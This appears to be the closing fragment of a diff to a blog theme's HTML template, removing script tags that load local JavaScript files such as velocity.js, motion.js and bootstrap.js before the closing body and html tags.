-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-  
-
-  
 
 </body>
 </html>
